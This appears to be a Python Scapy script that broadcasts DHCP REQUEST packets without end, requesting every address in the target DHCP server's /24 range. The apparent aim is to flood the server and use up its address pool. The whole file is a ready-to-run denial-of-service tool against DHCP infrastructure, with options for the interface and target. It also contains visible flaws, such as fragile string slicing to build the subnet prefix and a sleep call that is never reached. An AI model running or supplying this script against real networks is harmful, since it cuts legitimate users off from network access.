import sys
import argparse
from time import sleep

import helper_dhcp
from scapy.all import *
import socket,struct
from netaddr import IPAddress


op_dic=helper_dhcp.get_dhcp_options()

parser = argparse.ArgumentParser(description='Process some arguments.')
parser.add_argument("-i" ,"--iface", type=str, default='enp0s3',
                    help="Interface you wish to use")
parser.add_argument("-t","--target", type=str, default=op_dic['server_id'],
                    help="IP of target server")

args = parser.parse_args()


#def addressInNetwork(ip,netaddr,bits):
 #  "Is an address in a network"
  # ipaddr = struct.unpack('L',socket.inet_aton(ip))[0]
   #netmask = struct.unpack('L',socket.inet_aton(netaddr))[0] & ((2L<<int(bits)-1) - 1)
   #return ipaddr & netmask == netmask

def build_N_send_dhcp_request(req_ip):
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    ip = IP(src='0.0.0.0', dst='255.255.255.255')
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=helper_dhcp.hw)
    dhcp = DHCP(options=[("message-type", "request"), ("server_id", op_dic['server_id']),("hostname",'hello' ), ("requested_addr", req_ip),
                 ("param_req_list", "pad"), "end"])
    req=ether/ip/udp/bootp/dhcp
    sendp(req)

def main():
    subnet_mask=helper_dhcp.op_dic['subnet_mask']
    server_ip=helper_dhcp.op_dic['server_id']
    #cidr=IPAddress(str(subnet_mask)).netmask_bits()
    #for i in range(pow(2,32-int(cidr))):
    while(True):
        for i in range(255):
            if i<=255:
                build_N_send_dhcp_request(server_ip[:-1]+str(i))
    sleep(1000)
      #  elif i <= 65536:


if __name__=='__main__':
    main()